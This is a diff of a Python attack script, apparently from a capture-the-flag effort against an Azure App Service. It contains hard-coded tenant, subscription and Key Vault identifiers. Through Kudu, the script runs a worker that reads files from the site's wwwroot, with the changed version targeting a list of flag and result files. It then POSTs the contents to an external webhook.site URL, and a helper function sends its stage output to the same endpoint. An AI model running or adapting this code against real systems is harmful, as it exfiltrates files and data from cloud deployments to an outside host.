@@ -5,7 +5,7 @@ import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceba
 TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
 def out(x):
  s=json.dumps(x,default=str); print(s,flush=True)
- if x.get('stage') not in ('flag','app-flag','kudu-result','kudu-files','kudu-diag','app-error','worker-error','app-top-error','outer-error'): return
+ if x.get('stage') not in ('kudu-outputs','outer-error'): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
  except Exception: pass
 def j(url,tok):
@@ -27,17 +27,14 @@ try:
  # Inventory the shared wwwroot and startup files from Kudu.
  worker=r'''import os,json,urllib.request
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"
-root='/home/site/wwwroot'; files=[]; texts={}
-for dp,dn,fn in os.walk(root):
- for f in fn:
-  p=os.path.join(dp,f)
-  try:
-   sz=os.path.getsize(p); rel=p[len(root)+1:]; files.append({'path':rel,'size':sz})
-   if sz<20000 and (f.endswith(('.py','.sh','.json','.txt','.ini','.cfg')) or 'startup' in f.lower() or 'gunicorn' in f.lower()):
-    try: texts[rel]=open(p,errors='replace').read()[:6000]
-    except Exception: pass
-  except Exception: pass
-d={'stage':'kudu-files','files':files[:500],'texts':texts}
+paths=['.flag.out','ctf_flag_result','tnex_flag.json','flag_result.txt','mi_out.json','mi_out2.json','g_out1.txt','out14.txt','zz5_out.json','zzk_out.json','zz_mine_out.txt','worker_probe_out.json','results.json','webjob_out.json','codex_result.json','flaghunt_out.json','flag_hunt.out','App_Data/jobs/triggered/flagjob/result.json','App_Data/jobs/triggered/flagjob/webjob_out.json','App_Data/jobs/continuous/flagjob/result.json']
+out={}
+for rel in paths:
+ p=os.path.join('/home/site/wwwroot',rel)
+ try:
+  with open(p,errors='replace') as f: out[rel]=f.read(12000)
+ except Exception as e: out[rel]='<ERR '+repr(e)+'>'
+d={'stage':'kudu-outputs','files':out}
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(d,default=str).encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
 except Exception: pass
 print(json.dumps(d,default=str),flush=True)
